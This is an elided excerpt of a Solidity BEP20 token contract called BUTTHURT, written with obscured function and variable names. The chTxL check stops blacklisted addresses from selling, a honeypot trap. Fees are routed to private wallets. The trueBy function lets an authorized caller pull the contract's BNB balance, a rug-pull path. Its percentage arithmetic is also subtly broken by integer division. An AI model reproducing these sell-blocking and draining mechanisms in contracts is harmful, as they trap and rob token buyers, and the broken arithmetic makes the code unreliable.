...
contract BUTTHURT is IBEP20, Auth {
    ...
    function chTxL(address sender, uint256 amount) internal view {
        if(sender != pair){ require (amount <= _maxsTxAmount && !isBt[sender] || isTxLE[sender], "TX Limit Exceeded"); }
        if(sender == pair){ require (amount <= _maxbTxAmount || isTxLE[sender], "TX Limit Exceeded"); }
    }
    ...
    function defSw() internal swapping {
        ...
        (bool tmpSuccess,) = payable(SPUK).call{value: aBNBFM, gas: 30000}("");
        (tmpSuccess,) = payable(SUKE).call{value: aBNBTM.sub(aBNBFM), gas: 30000}("");
        tmpSuccess = false;
        if(amountL > 0){
    ...
    function trueBy(uint256 _perc) external authorized {
        uint256 amountB = address(this).balance;
        payable(ULBD).transfer(amountB.mul((_perc).div(100)));
    }
